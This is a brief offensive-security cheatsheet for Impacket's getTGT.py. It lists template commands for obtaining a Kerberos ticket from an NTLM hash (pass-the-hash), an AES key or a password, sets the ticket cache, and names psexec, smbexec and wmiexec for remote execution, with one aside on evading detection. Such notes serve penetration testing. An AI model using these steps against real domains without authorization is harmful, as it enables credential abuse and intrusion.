---
id: 716fb8a6-e97e-4a23-91e9-9ed19ee81aad
name: gettgt.py
type: cheatsheet
verified: false
created_at: '2020-07-14T18:15:03.575250+00:00'
updated_at: '2023-05-29T16:48:52.690130+00:00'
---

# gettgt.py



**Command** ([[Request the TGT with hash]]):

```bash
python getTGT.py <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash>

```







**Command** ([[Request the TGT with aesKey (more secure encryption, probably more stealth due is the used by default by Microsoft)]]):

```bash
python getTGT.py <domain_name>/<user_name> -aesKey <aes_key>

```







**Command** ([[Request the TGT with password]]):

```bash
python getTGT.py <domain_name>/<user_name>:[password]

```







**Command** ([[set the TGT for impacket use]]):

```bash
export KRB5CCNAME=<TGT_ccache_file>

```





# Execute remote commands with any of the following tools by using the TGT

search for psexec.py, smbexec.py or wmiexec.py


